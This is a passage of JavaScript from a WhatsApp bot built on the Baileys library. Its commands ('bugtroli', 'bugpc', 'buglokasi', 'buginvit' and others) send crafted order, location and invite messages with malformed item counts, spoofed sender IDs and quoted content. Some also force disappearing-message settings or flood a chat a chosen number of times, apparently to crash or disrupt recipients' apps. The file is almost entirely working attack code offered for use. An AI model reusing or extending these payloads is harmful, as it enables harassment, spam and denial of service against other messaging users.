								"mediaKey": "BXO9mBMMMTUsIuKolKNkdvKrTRqCUsVAodT2c5cz16A=",
								"fileEncSha256": "6eY5tqbUffAeC35hsdFpc/TIrfLTEmkB6wOFosH6Bjs=",
								"directPath": "/v/t62.7118-24/11947364_877631506213291_8995743566609849051_n.enc?ccb=11-4&oh=3173a27ea575a14a3549e0ace07bec93&oe=612EF9B9",
								"mediaKeyTimestamp": "1628129633",
								"viewOnce": true
							}
						}
					}
				},{quoted: mek})
                  hexa.relayWAMessage(res)
 break
 
case 'oncevid':
res = await hexa.prepareMessageFromContent(from,{
					"viewOnceMessage": {
						"message": {
							"videoMessage": {
								"url": "https://mmg.whatsapp.net/d/f/AmsBfXD1MIsjaboyqeCbX6hgal74dg4f7ukAPL1sty4l.enc",
								"mimetype": "video/mp4",
								"fileSha256": "Fi8kirqiMoq+hEdy+4Q6v78oRvx26zVh68bPU0dpCxY=",
								"fileLength": "9999999999",
								"seconds": 99,
								"mediaKey": "DiRDvbn2Vt7dFLXiBxbyv7c2sO4BS3vPpj4OtM0XYpM=",
								"height": 1138,
								"width": 640,
								"fileEncSha256": "H1J948Q7NaPzICeHs6RzzDkpMdH1X3CRIyPEXcNZuKI=",
								"directPath": "/v/t62.7161-24/29747677_444646636518257_7026527804713552982_n.enc?ccb=11-4&oh=2db2d8046b15ba65f83fa879a7eb71ad&oe=61327E84",
								"mediaKeyTimestamp": "1628277591",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAEAAwEAAAAAAAAAAAAAAAAAAgMEAQEBAQEBAAAAAAAAAAAAAAAAAAIBA//aAAwDAQACEAMQAAAAyuKdcBwZJT0TWbm2JjTMhdmsyruQpzZIqmJeyhsiZWobbwYjl3wjrx//xAAlEAACAgEEAQMFAAAAAAAAAAABAgADEQQSITFBExQgIjAzYYH/2gAIAQEAAT8A+znmZYQWMILT5Ea1j1FfBGZWu9iINOJ6NfRxDVQJaEDDA4lLlCT+ol7eTH+kZ7gY48S4ktEIzyYPSj2LtwBMxmz8sExNNe/SGe02/ksUQpSvWWnA8T3FNfFVQi1azUck7Fj6SpKt2SzZj7Kzlz/I9hY8cCf/xAAZEQACAwEAAAAAAAAAAAAAAAAQEQACMDL/2gAIAQIBAT8ALjx6uh//xAAbEQADAAIDAAAAAAAAAAAAAAAAARECAxASIP/aAAgBAwEBPwDmEIIo/OL667Buun//2Q==",
								"viewOnce": true
							}
						}
					}
				},
				{quoted: mek})
                  hexa.relayWAMessage(res)
break

case 'bugtroli':
              if (!mek.key.fromMe) return replyfakelink(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
hexa.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
      thumbnail: Mthumb,
        itemCount: -969769349, // Bug
         status: 1,
            surface: 1,
         message: '☠️yahaha wahyu☠️',
       orderTitle: 'YoWaImoO....', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
hexa.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break

case 'bugtroli2':
if (!mek.key.fromMe) return replyfakelink(mess.only.ownerB)
if (args.length < 1) return replyfakelink('Jumlahnya?')
		        try {
		        var hets = `${fake}`
		        var grousp = await hexa.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        hexa.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${fake}`,
						"orderTitle": `${fake}`,
						"sellerJid": "6283856237829@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        hexa.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${fake}`,
						"orderTitle": `${fake}`,
						"sellerJid": "6283856237829@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
		
case 'bugcombine':
if (!mek.key.fromMe) return replyfakelink(mess.only.ownerB)
                 hexa.toggleDisappearingMessages(from, 'HACKED')
hexa.sendMessage(from, `${fake}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${fake}`,
    orderTitle: `${fake}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    hexa.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    replyfakelink(`dahlah`)
break

case 'buglokasi':
if (!mek.key.fromMe) return replyfakelink(mess.only.ownerB)
hexa.updatePresence(from, Presence.composing)
		       hexa.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${fake}`,
						address: `${fake}`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${fake}`,
    orderTitle: `${fake}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break

case 'bugpc':
case 'bugpc':
if (!mek.key.fromMe) return replyfakelink(mess.only.ownerB)
hexa.updatePresence(from, Presence.composing)
hexa.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${fake}`,
    orderTitle: `${fake}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break 

case 'bugpc2':
if (!mek.key.fromMe) return replyfakelink(mess.only.ownerB)
if (args.length < 1) return replyfakelink('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
hexa.sendMessage(from, `${fake}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${fake}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break

					
case 'bugvid':
if (!mek.key.fromMe && !itsMe) return
         tapib3 = fs.readFileSync('./stik/hola.mp4')
         hexa.sendMessage(from, tapib3, document, { quoted: mek, filename:`FajarGanz ${vipi}`, mimetype: 'video/mp4' })
         await replyfakelink('ni bang videonya')
break


case 'bugfoto':
if (!mek.key.fromMe) return
         tapib2 = fs.readFileSync('./stik/virgam.jpeg')
         hexa.sendMessage(from, tapib2, document, { quoted: mek, filename:`FajarGanz ${vipi}`, mimetype: 'image/jpeg' })
         await replyfakelink('ni bang fotonya')
break

case 'bugmusik':
         if (!mek.key.fromMe) return
         tapib1 = fs.readFileSync('./stik/kasar.mp3')
         hexa.sendMessage(from, tapib1, document, { quoted: mek, filename:`FajarGanz ${vipi}.mp3`, mimetype: 'audio/application' })
         await replyfakelink('ni bang musiknya')
         break
         
case 'jadivilip': 
if (!mek.key.fromMe) return
replyfakelink('BY mek GANZ')
var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 var media = await hexa.downloadAndSaveMediaMessage(encmedia)
 var ran = getRandom('.mp4')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) return replyfakelink('```ERROR !```')
 var buffer = fs.readFileSync(ran)
hexa.sendMessage(from, buffer, document, {mimetype: 'audio/mp3', filename: `philip v hexa ${vipi}.mp3`, quoted: mek})
 fs.unlinkSync(ran)
 })
break         
         
case 'buginvit':
          if (!mek.key.fromMe) return
          replyfakelink('BY mek GANZ')
          buf = fs.readFileSync('./stik/virgam.jpeg')
          imeu = await hexa.prepareMessage('0@s.whatsapp.net', buf, image) 
          imeg = imeu.message.imageMessage
          res = await hexa.prepareMessageFromContent(from,{
     "groupInviteMessage": {
     "groupJid": "6283856237829-1627356532@g.us",
     "inviteCode": "h+64P9RhJDzgXSPf",
     "inviteExpiration": "1625338378",
     "groupName": `FajarGanz ${vipi}`,
     "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZYlCAbAiouWTkh8NRjO5PemOmw60uN7HdBV1OZZPFY7t1qOurqTkMLNzRE5A8jT4PulT8ai7r3Xxn3e1UlRJ2jcmWHU7UQhPKB5fnQUR5mHkKKVsKp9c0xDwIU79t6ctLZ7p8BSR2puOJpZuRerd607hLQI4bdXkQcx6ZqJzo0hCzOb3SZ7dS3IcDcjFKtf1TTI5oWygzjcUqj5WtlvF+AWHV7y2iWOCbCL0XAOKdHE+ooPrxsB5rUJNMkf1iPhUdc3buuF90YrVswNBfXL6GLneGKRfJVOTRB12VE5ns89Nlk9fhTcHgx6XbXE3NytEhJAz1A7Cibm3UQnAyNvzp9jHE1uJvrW0y/ca6XWLXqRKvxWmvogKjpXJtNsBRTphaDF1a0b/OI+KmnBqFq3S4j+ZxUabId0rg2IH9B+6jsOibWeJx7ksbD0Iqk8ccVwadA0MDCS6cEbdFrriRY7HTXmchFGxJ2rHdQu/pN08h2ycKPIfCpbY0jyWRpJGkcks3UmuUB/pBLdgBRFrZSzMvOCinz61N2dtEHEVvGJGHYdPmazlOjSMGyHj01zF40+AD0XuakLDQ5px4jIVQ+lW3TND5mWa7xJL2GPdUegovW5Bb2awwLhmPIoHc96z+Rs0+NIo9xEiOYoF9xDgnzNRvMWmIHn3qzXlmLS0bb3gNzj7/9+lV/ToTLdHY7b1pGXVmcouwaUlW37U3zHmp69U+PIF7b0Ez43860Rk0ESH3FYdajLz623TrRfPzQMCehoGRuZcHtTGdRbY88GnWcBQM9KGB2yK9D9qCSe0B1e+i8Q9962XRmCwoOmMVgVvM0TiRDgitS4T19Lq3VXcCUdfWsMqafI6MLtUX2UBunlmlTFrMJAPWlUbNDOHJyT1oaSn5NgaGffPlXQcaNZ0NFl0WxLb/yEH4CpC4XmgcDY4OCO1RvCjFuHrE/9MD8alH+qRjrWgFFvNc1O0uIEE+VdypDKD2r2Tii/iBJELfFP2NCcRLh7Vv+tj8DUTeNhDWatIGWCLjS52ElpCw81Yj96kU4sUf82zYeqyZ/SqCDipg75ocmgSHeOtds9T0c2xMlsedW5pMYPXbb51TdP0o3WoBIcCAqG8Qb8yjv99EcQWwu5UichUxztITgIB3/AB6ULpetjR7Jra0iimHMcyyOQTnyA6dPM1Em2utmkaWyfTSwX5nZ3zsqj3c/dU7pmnLAowiqc9BVe0XiqzZgL2Frdzt4medPvHT7qtaXUJHPHIpXA5TnY571zSUl9x1RcXoNJAIUHAA3PlUS3+KuzcLjkjHhwr6+de3c7yYhg2L7MfIV60iQgAEBYlzn1osaREcUMkMCwqdzux8gP71EcOQ87OzD62+3lS1G5N7dOV+qdiT5CndOk+j2c8g645QK01GiNsjo4PGuL18ZVcgVXpwVLDuDV00mDk06Z23J3+Jqn3g/xEo88mtYStsynGkmCByFNDnqacztTb7CtTJngOc1yKVIUEhFoOdyp6EUbp11Jpt8jcxCEgk+lA2XMblAn1jU1daRcSRYjSSWUAMFVSTg/CpdaZcb2jUNB1RJ4kJYc2N8GlVG0OHU7CBJJraeJc8uXQilXLJOLo6VJNWSMo7UM53oiU+tCyEV2HGatwU3Nw3ZeikfiammG3TtUBwC/Nwzb/6WYfjVhPSqQGecUrywQnuJx+tV+9bPKKsnFy/4UHyuF/OqzMjSz4QbDr6VDAYG+cVJpOmMFt6YW35B50POwXIHXzqBpEVxrKPo1ukZ92V2L478oGPzNVkA+AQOg3qxa6hn04d2hk5/kwwfxAqDZeWPB8t6qOh+wOGTw5Qc4Hf1FTejahMZo7eKQgZ9wdgfSoPwyGB6inrUslzG0YJYMMAd6JK0NNpmh2useFF/OQJKdgxoO/1IzoYbc+IzH3iOn31PLY209zc8mHQucxSqNjnseh/Cq3remSWk5a0k8FAccsm2D6VyxSbo6pNpDUgFvEoGC7nGfM0RHGXiSJQdtgv71Bwyuk/iTzr5c7I23wOMCrbongPCZYZEk5epU5x8aqacUTBqQ/dKLXTxHkcxG9Z9eHmvZwOgBq66vcKEYs2yjsapCHxBcTHozcoNPEqthm9ICccrN6VwVLMAK6lPvHHc09ZRl548dc10Wcx7f2ohSMr0IyaBq0TabJNyBkflxgnG5HlXVpw1JqV0LaArEx35n2AApJiaGeCNGOpag08x5LO3HNI/T5Zqwavxp9DJg0S3jESnHiOM83qB+9Seq6THw/wXc21q7OxIMkhGCxJAJ9KzWTONz6VehLsuek+0G/jcfT4YZoP6uUcrAenalVJK8qbdD1pUPsdF8lO9DSUTJQshpEml+zqQ/wDDwBOyyuPyNWkbiqf7Nmzos48p2/8AqtW5TVIbKbxJb/SIJEzy4kDZ+BqGS3AGR071aNVjLNIq78zdKg79JlXkjikA7nlNQ0BDXkgX3U6+YqJl2Jo+7BjHvZB9aYRAyqxqSroFVB4sAbdXbDA9CD2ovingi6tpJJdLXx7Y9I8++v70PdAh4huCWrULO4F1p8M3d0BPx71Em49mkEpdMwRtJv8AxeX6Fc83l4TZ/KrDw1w7crexz3KBXQ5SInfm7E+WK1WaATAhQK50+G3tXEZixLueYjrUSyN9GscSXZFvpzWtkD/Wep9ayHXdTl1LVXlaRzGmUiBOeVR0redWZZLJ8DmK74Hevn+/ga0vJrdwCY3K589+tViSUmTltoGEk0bZV2HqDRdncyxSeJG3hydOZe/oR3FCnpT6JygbjffY1uzBIl7y/jezDXAc8zcrRxtgj1yQdj2+flQptTJDB9EbMBBYF9iDnBJ/Kpzg20tb+S5tb2ESr4XMM9sEfv8AnUnf2VtAyRRRKltF0T7R9TWDkovijZRbXJsoc9k0ExSYjmABAB60Xo0XNcpyjpvT+tktdNIepAAx0FPaTA0cIk3DNWnrszdLRZ0OF6U5G5idXjJVx0IqJVplA99vOuhPOP6s/EUUZljiukvLeWy1A80MwK8x2xVH1jhq/wBOmbELzQA+7Ki5GPUdqmluZhgHl+6pLTdZmtyBK58MbYxkCm5UVFWUWy0e/v5Alvayv5nlIA+J6Uq16C6eYBg4wRnalWXzo6FhbWykymhZDRMvWhJD1rc5TQfZkS2nXqDtMD96/wBquFv4hU+KoV8/0tzbfHAqkeytsxaovk0ZHzDVeY5C0roY3ULjDHGG+G9UgG7OG2kMkkyM0nORnPSiTBZ9jIPlQVvNGkk6PIisJCcE4NEhwRswI9DQB01tbsMc+R5MlDS6RYyK3NBbn1KAUbbwSTkcg2+0egqp+1Th6/n0VrvS7u5JhGZ7dXIV08wB3FAErHwnp90ys1tFyDowz+FE6npVvp9siWKckSbFSc/OqP7HuMeYroeoye8B/hpGPUfYP6Vp+ox+PBImccw2PkamUbRUXTsp6zG25mlH8v03NcJeWOo8whmUumxwcEGnNRhZkKMMMDuKqlzpgWUvHzwyk55l2zXDJ8ej1/Gwxyq7plla3kVyBMxGO5qo8T8InUAZ7RgLodQ2wcfvVi0+W6aPEgDEbcxOC3yo+Es2Sy4og6doxyw7cZGHXenXNlM0d1C8bKce8Nj8D3rqysp7uYRWkLyv5KM4+Nbm8KSxlJEDoTnlYZBoC8uobOPwrZFMnZVAAX41u8tK2cyxd9FRs7Q6Bp7IzKdSnGWPUIOwpCO4vrNbpuUkAhwNsY7inbyB5HZ2y8rn5k0dqVsbLRVt1GWZcPjv5/rU43yfIMq4riUGSN767Y4IjXp8KmYowI0wPhVgsLFbLTvD5VaV8BsjOSev61a9J03TrxDmGAOvu8pXetkrMJMz0IdjXvh+lab/AMMWDKMwxg47MRTL8IWbdEcf9slXxIM78IY3H4UHqV5a2EYNw3vHog3JrvjDXNO0+Z7TRnknuEPK8rEFFPcDz/31qgTzSXEzSTOXc9STSoC5afxlDanlMEvh+WRSqk0qh4ot2aRyyiqRoUxwCaBlY9TRUzbGgZTWhmXn2UuPpWpp5pGcfAn960UVmHsrfGs3i+dvn7mH71poPSqQFE49gVjcyY94Rnf5UZ7OuEjd2sGo6kzi3IBihBI5/U+lWlOH01K9M18oNoB9Q/5n9qsiFI48KoVFGAqjAA8hUqPYx1VCIFRQqgYAA2FcsAV3wR3ryKZZowy9Om9dVQGA+1HhOTQNV/iulKyWUjh8pt4L5/AVevZ9xgvEem/R7twNSgH8wfbH2h+tXfUrO3v7Ke1u41kglUqynvXzlr2nahwLxMk1qzcisWglI2dfsn8jQBul7aiccw92QdD5/GoWaLw25ZkIb8/hRvCuvW3Emkpd2pCy/VlizujdxUnJCsilZFDDyNZzxqRpDI4lWkuBGMRx5+O1CS39woPJGmas0mkwv9Ush8utDHRGztMPmn965niyejojlh7KrLeX8ux91fIbVwkMxAUIWYnYDqauEeiIGBkmLeijFH29pBajMUYDEfWO5NC8eUnchvyIpfSisafpJhX6Rd48QfVTsv8Aembm2+k3Ku4HhR7n1NWm4tzLu2VXue9MPZpgKo90dzXUsaiqRyym5O2V6O1aWTxGGFA90Y3+NP20TQsChYEHIxU0LXB6ZxSS1DZ23p8SbHtPvRMBHLtKP/Kq37Q+LrTR9IuLW1uFfUplKIsbAmPOxY+VSetWAm0u8iDMjFCoZTgjI/vXzhNG0czxuMOrEH4inRJzXhr3vvSoA8pV7SoAvTqztyqCWPQCvTpV8+CltI3far7oNno0djFM0ZeZ0HMS+cHvRxXTCGPhfzOgbmrOXK+i0o+yp8BwT6brUkt3E0UbQsmW88g4/CtQ0lku7j3CHRDlv2qvQrpaLloH5sb4frVt0m3htLRDCnIrkOQTk/7xTg5extQrol17+QobqzKfjRMTK6+7TEq8r5FaEDFo/LPKnbqKIdsd6AVgmpY7MMUcBzHagDhnJHKO9QPF3D1rr2jS2V0oDn3o5Mbo3Y1YSBEpbqaFLmQnIoA+ctHvtQ4D4odLlGwp5ZowdpE8x+YrfNH1G21WxiurR1kgkGVYfl8agfaDwdFxHpxeBVXUYVzE/Tm/0n0rKuBuJrrhPWHstQEi2hflljbrG32h+tAG/mNSOuK8EIx9fFeRTJcW8UsLho5FDKynYg08iEgZoAbEKjq33V7hFGVXf1p4rXnLvQAG6FyC24zS8Eg9Mii+XpXQAIoABSHLHNdpAFfPY0SwCj1NJB71AEffwj6PP61818W2zWvEV/EwxiUn796+n5V8WKUAdGxXz/7XLf6PxfI3LgSxKw/L9KGIpPevDXrUqQHg6Uq9FKgDZuCnD295GVJKsrfeMfpVmjhQoCyY+VVHgJyb+7jzs0YbHwP96uzfVIBxt2pAc2VrFPeRwchIJ94hdgKudygCbDFV/hu1YNLLlmVMAFjkk1ZZRzR7U0MFt5SgGx22xRLkOmRuD0oHZWIpmV5Vy0ZGPs0wObja9hY/axUmJEQEsagZLsyTxJKMMGG/zo6UlsUAO3FxzkBRtXEZwd+9eQR8wJJ716y4NAD+NtqzT2o8FfxWNtS02L/HRjLoo/5ij9a0cMRTiYwWPQUAYd7M+NW02SPSNUbFqXxFI3+Uc/VPp+VbiuCvNnasW9pvB0izXGr6bH7hJeaJR0H2h+tH+yzjczxx6Nqkn85Ri3lY/WH2T6+VAGu4zuK8xvTUEwYU6DQB4wrzFODpXhGBQANKcuB2p1MYGaFmP8wfGlfzGK0Yr9YjA+NAHelsZo3PZmJH31jft5jjj1TTGVTzlJAW7HBXb8a1vS5JI7P8FxWV+3xOX+Bscc5E3Ty9ygDJT19KVIbivM0hHoPWlXi9aVAGqcFSCPXcEgB4mG5+B/StBY4FZtwo/h8RWvk3Mv4GtR0+IXF5Ap3Utk/AUgZNWDG0tkidcZ3PxNSdu4eLbeupIw+zAEUwITbtzR7oeoqgGLpCrZFNsvOnMtHyoJY8jrUcC0LkMPdNAyNnTFzFnGecVJdRQOoApcRsN1yKPU+7mgDyIlTt0p1m8+nnUHxO00FhHcQOyPFKp2OAfQ+nSovVLKS006DVY7mY3bcrMzHY5HYeVYTzOLarR6Hj+Cs0Yyc65Ol/stkeGmCcy82Nlzv91d6hcw2Vvz3EgRPM96r6aelrqmkSvJI15OS8rE9dv70LqV3HNxUy3kck0MC4SJF5t8DtSedpdo0x+BGc6TtU2/8AnXRN2t9Z34P0aRZMbMpG+PhWQe0/gl9Duf4tpCkWDNzMqdYW9PT8q0iNXfX4Lmz0+4t4CvLLzR8o+OPuq0zQR3dpJbzoskTgqynoRV4puadnP5fjxwySjpr+DK+AuPo7q1W21NmF5GMZAz4g8/j51oEOu2L2puPHUIDgg9c/CsB4k0G84e1B7yy51t4piqyL1jYHoavvsv1q21SWb6SIxfKoIQ9+uSo+6pc5tpw0y44cMIyjmtSX9mm6bqdpqCt9FlDFeo6EVzqmqWtgoFxKFYjIUbk/Kq9ofKOKNQZMLGFOQBtnI/vTWisdTvb24mhZvFPKJT0jXuB64xULPJpL27/o6Jf4/HGcpd8Uk/336J4TLMIpEzyuAwyMbGozUbxrrVhZRHCpgNjrnvR9pKlwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
      "caption": "https://chat.whatsapp.com/JemsKzkDVSr3mpBSC2fYZk","caption": "https://chat.whatsapp.com/JemsKzkDVSr3mpBSC2fYZk",
      "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
          }
     }
           }, {quoted:imeu, contextInfo:{}})
           hexa.relayWAMessage(res)
           await setTimeout(() => {
            replyfakelink('LORD mek GANZ')
}, 3000)
break

case 'troliv2': 
                  freplyfakelink('TuhTroliV2')
                  buf = fs.readFileSync('./stik/virgam.jpeg')
                  imeu = hexa.prepareMessage('0@s.whatsapp.net', buf, image) 
                  imeg = mek.message.imageMessage
                  res = hexa.prepareMessageFromContent(from,{
                  "orderMessage": {
                  "orderId": "350509896500745",
